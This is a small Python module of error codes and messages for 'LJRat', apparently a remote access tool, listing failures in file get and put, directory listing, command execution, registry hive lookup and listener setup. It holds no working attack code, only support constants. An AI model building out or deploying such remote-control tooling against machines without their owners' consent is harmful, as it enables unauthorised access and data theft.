"""
Module that provides error codes used throughout LJRat
"""

E_SUCCESS = 0x0000
E_FAILURE = 0x0001
E_EXIT = 0x0002
E_FILE_EXISTS_ERROR = 0x1000
E_GET_ERROR = 0x1001
E_PUT_ERROR = 0x1002
E_DIR_ERROR = 0x1003
E_EXECUTE_ERROR = 0x1004
E_HIVE_DOESNT_EXIST = 0x1005

ERROR_TABLE = {
    0x0000: "Command was executed successfully",
    0x0001: "Error failure",
    0x1000: "Error file exists error",
    0x1001: "Error getting file",
    0x1002: "Error putting file",
    0x1003: "Error Directory listing",
    0x1004: "Error executing command",
    0x1005: "Hive doesn't exist"
    
}

E_LISTEN_ERROR = 0x2000
SYNTAX_TABLE = {
    0x2000: "Syntax Error: listen [name] [ip] [port]"
}